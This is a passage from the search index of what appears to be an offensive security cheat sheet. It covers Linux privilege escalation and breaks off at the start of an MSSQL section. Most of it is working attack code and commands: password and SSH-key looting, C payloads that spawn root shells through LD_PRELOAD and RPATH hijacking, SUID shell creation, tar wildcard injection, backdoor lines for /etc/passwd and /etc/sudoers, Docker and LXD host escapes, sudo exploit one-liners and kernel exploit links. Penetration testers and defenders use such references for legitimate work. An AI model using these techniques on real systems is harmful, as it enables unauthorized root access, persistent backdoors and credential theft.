lse.sh\n./lse.sh -l1 # shows interesting information that should help you to privesc\n./lse.sh -l2 # dump all the information it gathers about the system\n</code></pre> </li> <li> <p>LinEnum - Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</p> <pre><code>./LinEnum.sh -s -k keyword -r report -e /tmp/ -t\n</code></pre> </li> <li> <p>BeRoot - Privilege Escalation Project - Windows / Linux / Mac</p> </li> <li>linuxprivchecker.py - a Linux Privilege Escalation Check Script</li> <li>unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check</li> <li>Privilege Escalation through sudo - Linux</li> </ul>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#checklists","title":"Checklists","text":"<ul> <li>Kernel and distribution release details</li> <li>System Information:</li> <li>Hostname</li> <li>Networking details:</li> <li>Current IP</li> <li>Default route details</li> <li>DNS server information</li> <li>User Information:</li> <li>Current user details</li> <li>Last logged on users</li> <li>Shows users logged onto the host</li> <li>List all users including uid/gid information</li> <li>List root accounts</li> <li>Extracts password policies and hash storage method information</li> <li>Checks umask value</li> <li>Checks if password hashes are stored in /etc/passwd</li> <li>Extract full details for 'default' uid's such as 0, 1000, 1001 etc</li> <li>Attempt to read restricted files i.e. /etc/shadow</li> <li>List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)</li> <li>Basic SSH checks</li> <li>Privileged access:</li> <li>Which users have recently used sudo</li> <li>Determine if /etc/sudoers is accessible</li> <li>Determine if the current user has Sudo access without a password</li> <li>Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)</li> <li>Is root's home directory accessible</li> <li>List permissions for /home/</li> <li>Environmental:</li> <li>Display current $PATH</li> <li>Displays env information</li> <li>Jobs/Tasks:</li> <li>List all cron jobs</li> <li>Locate all world-writable cron jobs</li> <li>Locate cron jobs owned by other users of the system</li> <li>List the active and inactive systemd timers</li> <li>Services:</li> <li>List network connections (TCP &amp; UDP)</li> <li>List running processes</li> <li>Lookup and list process binaries and associated permissions</li> <li>List inetd.conf/xined.conf contents and associated binary file permissions</li> <li>List init.d binary permissions</li> <li>Version Information (of the following):</li> <li>Sudo</li> <li>MYSQL</li> <li>Postgres</li> <li>Apache<ul> <li>Checks user config</li> <li>Shows enabled modules</li> <li>Checks for htpasswd files</li> <li>View www directories</li> </ul> </li> <li>Default/Weak Credentials:</li> <li>Checks for default/weak Postgres accounts</li> <li>Checks for default/weak MYSQL accounts</li> <li>Searches:</li> <li>Locate all SUID/GUID files</li> <li>Locate all world-writable SUID/GUID files</li> <li>Locate all SUID/GUID files owned by root</li> <li>Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)</li> <li>Locate files with POSIX capabilities</li> <li>List all world-writable files</li> <li>Find/list all accessible *.plan files and display contents</li> <li>Find/list all accessible *.rhosts files and display contents</li> <li>Show NFS server details</li> <li>Locate .conf and .log files containing keyword supplied at script runtime</li> <li>List all *.conf files located in /etc</li> <li>Locate mail</li> <li>Platform/software specific tests:</li> <li>Checks to determine if we're in a Docker container</li> <li>Checks to see if the host has Docker installed</li> <li>Checks to determine if we're in an LXC container</li> </ul>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#looting-for-passwords","title":"Looting for passwords","text":""},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#files-containing-passwords","title":"Files containing passwords","text":"<pre><code>grep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2&gt; /dev/null\nfind . -type f -exec grep -i -I \"PASSWORD\" {} /dev/null \\;\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#old-passwords-in-etcsecurityopasswd","title":"Old passwords in /etc/security/opasswd","text":"<p>The <code>/etc/security/opasswd</code> file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.</p> <p> Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes </p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#last-edited-files","title":"Last edited files","text":"<p>Files that were edited in the last 10 minutes</p> <pre><code>find / -mmin -10 2&gt;/dev/null | grep -Ev \"^/proc\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#in-memory-passwords","title":"In memory passwords","text":"<pre><code>strings /dev/mem -n10 | grep -i PASS\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#find-sensitive-files","title":"Find sensitive files","text":"<pre><code>$ locate password | more           \n/boot/grub/i386-pc/password.mod\n/etc/pam.d/common-password\n/etc/pam.d/gdm-password\n/etc/pam.d/gdm-password.original\n/lib/live/config/0031-root-password\n...\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#ssh-key","title":"SSH Key","text":""},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#sensitive-files","title":"Sensitive files","text":"<pre><code>find / -name authorized_keys 2&gt; /dev/null\nfind / -name id_rsa 2&gt; /dev/null\n...\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#ssh-key-predictable-prng-authorized_keys-process","title":"SSH Key Predictable PRNG (Authorized_Keys) Process","text":"<p>This module describes how to attempt to use an obtained authorized_keys file on a host system.</p> <p>Needed : SSH-DSS String from authorized_keys file</p> <p>Steps</p> <ol> <li>Get the authorized_keys file. An example of this file would look like so:</li> </ol> <pre><code>ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... \n</code></pre> <ol> <li>Since this is an ssh-dss key, we need to add that to our local copy of <code>/etc/ssh/ssh_config</code> and <code>/etc/ssh/sshd_config</code>:</li> </ol> <pre><code>echo \"PubkeyAcceptedKeyTypes=+ssh-dss\" &gt;&gt; /etc/ssh/ssh_config\necho \"PubkeyAcceptedKeyTypes=+ssh-dss\" &gt;&gt; /etc/ssh/sshd_config\n/etc/init.d/ssh restart\n</code></pre> <ol> <li>Get g0tmi1k's debian-ssh repository and unpack the keys:</li> </ol> <pre><code>git clone https://github.com/g0tmi1k/debian-ssh\ncd debian-ssh\ntar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2\n</code></pre> <ol> <li>Grab the first 20 or 30 bytes from the key file shown above starting with the <code>\"AAAA...\"</code> portion and grep the unpacked keys with it as:</li> </ol> <pre><code>grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'\ndsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub\n</code></pre> <ol> <li>IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the '.pub' extension and do:</li> </ol> <pre><code>ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934\n</code></pre> <p>And you should connect without requiring a password. If stuck, the <code>-vvv</code> verbosity should provide enough details as to why.</p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#scheduled-tasks","title":"Scheduled tasks","text":""},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#cron-jobs","title":"Cron jobs","text":"<p>Check if you have access with write permission on these files.  Check inside the file, to find other paths with write permissions.   </p> <pre><code>/etc/init.d\n/etc/cron*\n/etc/crontab\n/etc/cron.allow\n/etc/cron.d \n/etc/cron.deny\n/etc/cron.daily\n/etc/cron.hourly\n/etc/cron.monthly\n/etc/cron.weekly\n/etc/sudoers\n/etc/exports\n/etc/anacrontab\n/var/spool/cron\n/var/spool/cron/crontabs/root\ncrontab -l\nls -alh /var/spool/cron;\nls -al /etc/ | grep cron\nls -al /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow\ncat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny*\n</code></pre> <p>You can use pspy to detect a CRON job.</p> <pre><code># print both commands and file system events and scan procfs every 1000 ms (=1sec)\n./pspy64 -pf -i 1000 \n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#systemd-timers","title":"Systemd timers","text":"<pre><code>systemctl list-timers --all\nNEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES\nMon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service\nMon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service\nMon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service\n3 timers listed.\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#suid","title":"SUID","text":"<p>SUID/Setuid stands for \"set user ID upon execution\", it is enabled by default in every Linux distributions. If a file with this bit is run, the uid will be changed by the owner one. If the file owner is <code>root</code>, the uid will be changed to <code>root</code> even if it was executed from user <code>bob</code>. SUID bit is represented by an <code>s</code>.</p> <pre><code>\u256d\u2500swissky@lab ~  \n\u2570\u2500$ ls /usr/bin/sudo -alh                  \n-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#find-suid-binaries","title":"Find SUID binaries","text":"<pre><code>find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \\;\nfind / -uid 0 -perm -4000 -type f 2&gt;/dev/null\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#create-a-suid-binary","title":"Create a SUID binary","text":"Function Description setreuid() sets real and effective user IDs of the calling process setuid() sets the effective user ID of the calling process setgid() sets the effective group ID of the calling process <pre><code>print 'int main(void){\\nsetresuid(0, 0, 0);\\nsystem(\"/bin/sh\");\\n}' &gt; /tmp/suid.c   gcc -o /tmp/suid /tmp/suid.c  sudo chmod +x /tmp/suid # execute right\nsudo chmod +s /tmp/suid # setuid bit\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#capabilities","title":"Capabilities","text":""},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#list-capabilities-of-binaries","title":"List capabilities of binaries","text":"<pre><code>\u256d\u2500swissky@lab ~  \n\u2570\u2500$ /usr/bin/getcap -r  /usr/bin\n/usr/bin/fping                = cap_net_raw+ep\n/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip\n/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep\n/usr/bin/rlogin               = cap_net_bind_service+ep\n/usr/bin/ping                 = cap_net_raw+ep\n/usr/bin/rsh                  = cap_net_bind_service+ep\n/usr/bin/rcp                  = cap_net_bind_service+ep\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#edit-capabilities","title":"Edit capabilities","text":"<pre><code>/usr/bin/setcap -r /bin/ping            # remove\n/usr/bin/setcap cap_net_raw+p /bin/ping # add\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#interesting-capabilities","title":"Interesting capabilities","text":"<p>Having the capability =ep means the binary has all the capabilities. <pre><code>$ getcap openssl /usr/bin/openssl \nopenssl=ep\n</code></pre></p> <p>Alternatively the following capabilities can be used in order to upgrade your current privileges.</p> <pre><code>cap_dac_read_search # read anything\ncap_setuid+ep # setuid\n</code></pre> <p>Example of privilege escalation with <code>cap_setuid+ep</code></p> <pre><code>$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7\n$ python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\nsh-5.0# id\nuid=0(root) gid=1000(swissky)\n</code></pre> Capabilities name Description CAP_AUDIT_CONTROL Allow to enable/disable kernel auditing CAP_AUDIT_WRITE Helps to write records to kernel auditing log CAP_BLOCK_SUSPEND This feature can block system suspends CAP_CHOWN Allow user to make arbitrary change to files UIDs and GIDs CAP_DAC_OVERRIDE This helps to bypass file read, write and execute permission checks CAP_DAC_READ_SEARCH This only bypasses file and directory read/execute permission checks CAP_FOWNER This enables bypass of permission checks on operations that normally require the filesystem UID of the process to match the UID of the file CAP_KILL Allow the sending of signals to processes belonging to others CAP_SETGID Allow changing of the GID CAP_SETUID Allow changing of the UID CAP_SETPCAP Helps to transferring and removal of current set to any PID CAP_IPC_LOCK This helps to lock memory CAP_MAC_ADMIN Allow MAC configuration or state changes CAP_NET_RAW Use RAW and PACKET sockets CAP_NET_BIND_SERVICE SERVICE Bind a socket to internet domain privileged ports"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#sudo","title":"SUDO","text":"<p>Tool: Sudo Exploitation</p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#nopasswd","title":"NOPASSWD","text":"<p>Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.</p> <pre><code>$ sudo -l\n\nUser demo may run the following commands on crashlab:\n    (root) NOPASSWD: /usr/bin/vim\n</code></pre> <p>In this example the user <code>demo</code> can run <code>vim</code> as <code>root</code>, it is now trivial to get a shell by adding an ssh key into the root directory or by calling <code>sh</code>.</p> <pre><code>sudo vim -c '!sh'\nsudo -u root vim -c '!sh'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#ld_preload-and-nopasswd","title":"LD_PRELOAD and NOPASSWD","text":"<p>If <code>LD_PRELOAD</code> is explicitly defined in the sudoers file</p> <pre><code>Defaults        env_keep += LD_PRELOAD\n</code></pre> <p>Compile the following shared object using the C code below with <code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\nvoid _init() {\nunsetenv(\"LD_PRELOAD\");\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}\n</code></pre> <p>Execute any binary with the LD_PRELOAD to spawn a shell : <code>sudo LD_PRELOAD=&lt;full_path_to_so_file&gt; &lt;program&gt;</code>, e.g: <code>sudo LD_PRELOAD=/tmp/shell.so find</code></p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#doas","title":"Doas","text":"<p>There are some alternatives to the <code>sudo</code> binary such as <code>doas</code> for OpenBSD, remember to check its configuration at <code>/etc/doas.conf</code></p> <pre><code>permit nopass demo as root cmd vim\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#sudo_inject","title":"sudo_inject","text":"<p>Using https://github.com/nongiach/sudo_inject</p> <pre><code>$ sudo whatever\n[sudo] password for user:    \n# Press &lt;ctrl&gt;+c since you don't have the password. \n# This creates an invalid sudo tokens.\n$ sh exploit.sh\n.... wait 1 seconds\n$ sudo -i # no password required :)\n# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf</p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#cve-2019-14287","title":"CVE-2019-14287","text":"<pre><code># Exploitable when a user have the following permissions (sudo -l)\n(ALL, !root) ALL\n# If you have a full TTY, you can exploit it like this\nsudo -u#-1 /bin/bash\nsudo -u#4294967295 id\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#gtfobins","title":"GTFOBins","text":"<p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p> <p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p> <p>gdb -nx -ex '!sh' -ex quit   sudo mysql -e '! /bin/sh'   strace -o /dev/null /bin/sh   sudo awk 'BEGIN {system(\"/bin/sh\")}'</p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#wildcard","title":"Wildcard","text":"<p>By using tar with \u2013checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. \u201cTricking\u201d root to use the specific options is quite easy, and that's where the wildcard comes in handy.</p> <pre><code># create file for exploitation\ntouch -- \"--checkpoint=1\"\ntouch -- \"--checkpoint-action=exec=sh shell.sh\"\necho \"#\\!/bin/bash\\ncat /etc/passwd &gt; /tmp/flag\\nchmod 777 /tmp/flag\" &gt; shell.sh\n# vulnerable script\ntar cf archive.tar *\n</code></pre> <p>Tool: wildpwn</p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#writable-files","title":"Writable files","text":"<p>List world writable files on the system.</p> <pre><code>find / -writable ! -user `whoami` -type f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \\; 2&gt;/dev/null\nfind / -perm -2 -type f 2&gt;/dev/null\nfind / ! -path \"*/proc/*\" -perm -2 -type f -print 2&gt;/dev/null\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#writable-etcsysconfignetwork-scripts-centosredhat","title":"Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)","text":"<p>/etc/sysconfig/network-scripts/ifcfg-1337 for example</p> <p><pre><code>NAME=Network /bin/id  &amp;lt;= Note the blank space\nONBOOT=yes\nDEVICE=eth0\nEXEC :\n./etc/sysconfig/network-scripts/ifcfg-1337\n</code></pre> src : https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#writable-etcpasswd","title":"Writable /etc/passwd","text":"<p>First generate a password with one of the following commands.</p> <pre><code>openssl passwd -1 -salt hacker hacker\nmkpasswd -m SHA-512 hacker\npython2 -c 'import crypt; print crypt.crypt(\"hacker\", \"$6$salt\")'\n</code></pre> <p>Then add the user <code>hacker</code> and add the generated password.</p> <pre><code>hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash\n</code></pre> <p>E.g: <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p> <p>You can now use the <code>su</code> command with <code>hacker:hacker</code></p> <p>Alternatively you can use the following lines to add a dummy user without a password.   WARNING: you might degrade the current security of the machine.</p> <pre><code>echo 'dummy::0:0::/root:/bin/bash' &gt;&gt;/etc/passwd\nsu - dummy\n</code></pre> <p>NOTE: In BSD platforms <code>/etc/passwd</code> is located at <code>/etc/pwd.db</code> and <code>/etc/master.passwd</code>, also the <code>/etc/shadow</code> is renamed to <code>/etc/spwd.db</code>. </p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#writable-etcsudoers","title":"Writable /etc/sudoers","text":"<pre><code>echo \"username ALL=(ALL:ALL) ALL\"&gt;&gt;/etc/sudoers\n# use SUDO without password\necho \"username ALL=(ALL) NOPASSWD: ALL\" &gt;&gt;/etc/sudoers\necho \"username ALL=NOPASSWD: /bin/bash\" &gt;&gt;/etc/sudoers\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#nfs-root-squashing","title":"NFS Root Squashing","text":"<p>When no_root_squash appears in <code>/etc/exports</code>, the folder is shareable and a remote user can mount it.</p> <pre><code># remote check the name of the folder\nshowmount -e 10.10.10.10\n# create dir\nmkdir /tmp/nfsdir  \n# mount directory \nmount -t nfs 10.10.10.10:/shared /tmp/nfsdir    \ncd /tmp/nfsdir\n# copy wanted shell \ncp /bin/bash .  \n# set suid permission\nchmod +s bash   \n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#shared-library","title":"Shared Library","text":""},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#ldconfig","title":"ldconfig","text":"<p>Identify shared libraries with <code>ldd</code></p> <pre><code>$ ldd /opt/binary\nlinux-vdso.so.1 (0x00007ffe961cd000)\nvulnlib.so.8 =&gt; /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)\n/lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        \n</code></pre> <p>Create a library in <code>/tmp</code> and activate the path.</p> <pre><code>gcc \u2013Wall \u2013fPIC \u2013shared \u2013o vulnlib.so /tmp/vulnlib.c\necho \"/tmp/\" &gt; /etc/ld.so.conf.d/exploit.conf &amp;&amp; ldconfig -l /tmp/vulnlib.so\n/opt/binary\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#rpath","title":"RPATH","text":"<pre><code>level15@nebula:/home/flag15$ readelf -d flag15 | egrep \"NEEDED|RPATH\"\n0x00000001 (NEEDED)                     Shared library: [libc.so.6]\n0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]\nlevel15@nebula:/home/flag15$ ldd ./flag15 \nlinux-gate.so.1 =&gt;  (0x0068c000)\nlibc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x00110000)\n/lib/ld-linux.so.2 (0x005bb000)\n</code></pre> <p>By copying the lib into <code>/var/tmp/flag15/</code> it will be used by the program in this place as specified in the <code>RPATH</code> variable.</p> <pre><code>level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/\nlevel15@nebula:/home/flag15$ ldd ./flag15 \nlinux-gate.so.1 =&gt;  (0x005b0000)\nlibc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00110000)\n/lib/ld-linux.so.2 (0x00737000)\n</code></pre> <p>Then create an evil library in <code>/var/tmp</code> with <code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p> <pre><code>#include&lt;stdlib.h&gt;\n#define SHELL \"/bin/sh\"\nint __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))\n{\nchar *file = SHELL;\nchar *argv[] = {SHELL,0};\nsetresuid(geteuid(),geteuid(), geteuid());\nexecve(file,argv,0);\n}\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#groups","title":"Groups","text":""},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#docker","title":"Docker","text":"<p>Mount the filesystem in a bash container, allowing you to edit the <code>/etc/passwd</code> as root, then add a backdoor account <code>toor:password</code>.</p> <pre><code>$&gt; docker run -it --rm -v $PWD:/mnt bash\n$&gt; echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' &gt;&gt; /mnt/etc/passwd\n</code></pre> <p>Almost similar but you will also see all processes running on the host and be connected to the same NICs.</p> <pre><code>docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash\n</code></pre> <p>Or use the following docker image from chrisfosterelli to spawn a root shell</p> <pre><code>$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease\nlatest: Pulling from chrisfosterelli/rootplease\n2de59b831a23: Pull complete \n354c3661655e: Pull complete \n91930878a2d7: Pull complete \na3ed95caeb02: Pull complete \n489b110c54dc: Pull complete \nDigest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0\nStatus: Downloaded newer image for chrisfosterelli/rootplease:latest\nYou should now have a root shell on the host OS\nPress Ctrl-D to exit the docker instance / shell\nsh-5.0# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>More docker privilege escalation using the Docker Socket.</p> <pre><code>sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash\nsudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#lxclxd","title":"LXC/LXD","text":"<p>The privesc requires to run a container with elevated privileges and mount the host filesystem inside.</p> <pre><code>\u256d\u2500swissky@lab ~  \n\u2570\u2500$ id\nuid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)\n</code></pre> <p>Build an Alpine image and start it using the flag <code>security.privileged=true</code>, forcing the container to interact as root with the host filesystem.</p> <pre><code># build a simple alpine image\ngit clone https://github.com/saghul/lxd-alpine-builder\n./build-alpine -a i686\n# import the image\nlxc image import ./alpine.tar.gz --alias myimage\n# run the image\nlxc init myimage mycontainer -c security.privileged=true\n# mount the /root into the image\nlxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true\n# interact with the container\nlxc start mycontainer\nlxc exec mycontainer /bin/sh\n</code></pre> <p>Alternatively https://github.com/initstring/lxd_root</p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#hijack-tmux-session","title":"Hijack TMUX session","text":"<p>Require a read access to the tmux socket : <code>/tmp/tmux-1000/default</code>.</p> <pre><code>export TMUX=/tmp/tmux-1000/default,1234,0 \ntmux ls\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#kernel-exploits","title":"Kernel Exploits","text":"<p>Precompiled exploits can be found inside these repositories, run them at your own risk ! * bin-sploits - @offensive-security * kernel-exploits - @lucyoa</p> <p>The following exploits are known to work well, search for more exploits with <code>searchsploit -w linux kernel centos</code>.</p> <p>Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing <code>uname -a</code> Copy the kernel version and distribution, and search for it in google or in https://www.exploit-db.com/.</p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#cve-2022-0847-dirtypipe","title":"CVE-2022-0847 (DirtyPipe)","text":"<p>Linux Privilege Escalation - Linux Kernel 5.8 &lt; 5.16.11</p> <pre><code>https://www.exploit-db.com/exploits/50808\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#cve-2016-5195-dirtycow","title":"CVE-2016-5195 (DirtyCow)","text":"<p>Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p> <pre><code># make dirtycow stable\necho 0 &gt; /proc/sys/vm/dirty_writeback_centisecs\ng++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil\nhttps://github.com/dirtycow/dirtycow.github.io/wiki/PoCs\nhttps://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#cve-2010-3904-rds","title":"CVE-2010-3904 (RDS)","text":"<p>Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8</p> <pre><code>https://www.exploit-db.com/exploits/15285/\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#cve-2010-4258-full-nelson","title":"CVE-2010-4258 (Full Nelson)","text":"<p>Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)</p> <pre><code>https://www.exploit-db.com/exploits/15704/\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#cve-2012-0056-mempodipper","title":"CVE-2012-0056 (Mempodipper)","text":"<p>Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</p> <pre><code>https://www.exploit-db.com/exploits/18411\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#references","title":"References","text":"<ul> <li>SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m</li> <li>Privilege escalation via Docker - April 22, 2015 - Chris Foster</li> <li>An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018</li> <li>Exploiting wildcards on Linux - Berislav Kucan</li> <li>Code Execution With Tar Command - p4pentest</li> <li>Back To The Future: Unix Wildcards Gone Wild - Leon Juranic</li> <li>HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018</li> <li>Privilege Escalation via lxd - @reboare</li> <li>Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018</li> <li>Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc</li> <li>Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates</li> <li>Local Privilege Escalation Workshop - Slides.pdf - @sagishahar</li> <li>SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs</li> <li>The Dirty Pipe Vulnerability</li> </ul>"},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/","title":"MSSQL Server","text":""},{"location":"Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Identify Instances and Databases<ul> <li>Discover Local SQL Server Instances</li> <li>Discover Domain SQL Server Instances</li> <li>Discover Remote SQL Server Instances</li> <li>Identify Encrypted databases </li> <li>Version Query</li> </ul> </li> <li>Identify Sensitive Information<ul> <li>Get Tables from a Specific Database</li> <li>Gather 5 Entries from Each Column</li> <li>Gather 5 Entries from a Specific Table</li> <li>Dump common information from server to files</li> </ul> </li> <li>Linked Database<ul> <li>Find Trusted Link</li> <li>Execute Query Through The Link</li> <li>Crawl Links for Instances in the Domain </li> <li>Crawl Links for a Specific Instance</li> <li>Query Version of Linked Database</li> <li>Execute Procedure on Linked Database</li> <li>Determine Names of Linked Databases </li> <li>Determine All the Tables Names from a Selected Linked Database</li> <li>Gather the Top 5 Columns from a Selected Linked Table</li> <li>Gather Entries from a Selected Linked Column</li> </ul> </li> <li>Command 